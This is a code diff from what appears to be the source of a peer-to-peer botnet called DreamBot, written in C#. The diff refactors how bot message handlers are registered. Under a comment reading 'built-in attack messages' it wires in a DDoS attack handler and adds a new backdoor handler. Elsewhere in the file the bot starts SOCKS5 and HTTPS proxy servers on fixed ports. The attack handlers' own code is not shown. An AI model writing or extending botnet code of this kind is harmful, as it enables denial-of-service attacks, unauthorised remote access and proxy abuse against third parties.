@@ -116,22 +116,82 @@ namespace DreamBot
             var peersManager = new PeerManager(_communicationManager, _peerList, _worker, BotIdentifier.Id);
             _messagesManager = new MessageManager(peersManager);
 
-            // Peer-to-Peer system messages
-            _messagesManager.Register(0x00, MessageType.Request,  typeof(HelloMessage), new HelloMessageHandler(_peerList, _messagesManager), false, 20);
-            _messagesManager.Register(0x01, MessageType.Reply, typeof(HelloReplyMessage), new HelloReplyMessageHandler(_peerList, _messagesManager), true, 10);
-            _messagesManager.Register(0x02, MessageType.Request, typeof(GetPeerListMessage), new GetPeerListMessageHandler(_peerList, _messagesManager), true, 18);
-            _messagesManager.Register(0x03, MessageType.Reply, typeof(GetPeerListReplyMessage), new GetPeerListReplyMessageHandler(_peerList, _messagesManager), true, 10);
-            //_messagesManager.Register(0x04, MessageType.Request, typeof(PingMessage), new PingMessageHandler(_peerList, _messagesManager), true, 8);
-            //_messagesManager.Register(0x05, MessageType.Reply, typeof(PongMessage), new PongMessageHandler(_peerList, _messagesManager), true,8);
-            _messagesManager.Register(0x06, MessageType.Request, typeof(DosAttackMessage), new DosAttackHandler(_peerList, _messagesManager), true, 0);
-            _messagesManager.Register(0x03, MessageType.Reply, typeof(GetPeerListReplyMessage), new GetPeerListReplyMessageHandler(_peerList, _messagesManager), true, 10);
-
-            _messagesManager.Register(0xFF, MessageType.Special, typeof(InvalidMessage), new InvalidMessageHandler(_peerList), false, 0);
+            RegisterMessageHandlers(peersManager);
 
             _socks5 = new Socks5Server(8009);
             _https = new HttpsProxyServer(8019);
             _connectivityTester = new ConnectivityTester();
 //            _connectivityTester.OnConnectivityStatusChanged += OnConnectivityStatusChanged;
+        }
+
+        private void RegisterMessageHandlers(PeerManager peersManager)
+        {
+            // Peer-to-Peer system messages
+            _messagesManager.Register(
+                MessageCode.Hello,
+                MessageType.Request,
+                typeof(HelloMessage),
+                new HelloMessageHandler(_peerList, _messagesManager),
+                false,
+                (int)Difficulty.Hardest);
+            _messagesManager.Register(
+                MessageCode.HelloReply,
+                MessageType.Reply,
+                typeof(HelloReplyMessage),
+                new HelloReplyMessageHandler(_peerList, _messagesManager),
+                false,
+                (int)Difficulty.Medium);
+            _messagesManager.Register(
+                MessageCode.GetPeerList,
+                MessageType.Request,
+                typeof(GetPeerListMessage),
+                new GetPeerListMessageHandler(_peerList, _messagesManager),
+                true,
+                (int)Difficulty.Hard);
+            _messagesManager.Register(
+                MessageCode.GetPeerListReply,
+                MessageType.Reply,
+                typeof(GetPeerListReplyMessage),
+                new GetPeerListReplyMessageHandler(_peerList, _messagesManager),
+                true,
+                (int)Difficulty.Medium);
+            _messagesManager.Register(
+                MessageCode.Ping,
+                MessageType.Request,
+                typeof(PingMessage),
+                new PingMessageHandler(_peerList, _messagesManager),
+                true,
+                (int)Difficulty.Easy);
+            _messagesManager.Register(
+                MessageCode.Pong,
+                MessageType.Reply,
+                typeof(PongMessage),
+                new PongMessageHandler(_peerList, _messagesManager),
+                true,
+                (int)Difficulty.Easy);
+
+            // built-in attack messages
+            _messagesManager.Register(
+                MessageCode.DDos,
+                MessageType.Request,
+                typeof(DosAttackMessage),
+                new DosAttackHandler(_peerList, _messagesManager),
+                true,
+                (int)Difficulty.NoWork);
+            _messagesManager.Register(
+                MessageCode.Backdoor,
+                MessageType.Reply,
+                typeof(BackdoorHandler),
+                new BackdoorHandler(_messagesManager),
+                true,
+                (int)Difficulty.NoWork);
+            _messagesManager.Register(
+                MessageCode.Unknown,
+                MessageType.Special,
+                typeof(InvalidMessage),
+                new InvalidMessageHandler(_peerList),
+                false,
+                (int)Difficulty.NoWork);
         }
 
         private void DesperateModeActivated(object sender, DesparateModeActivatedEventArgs e)
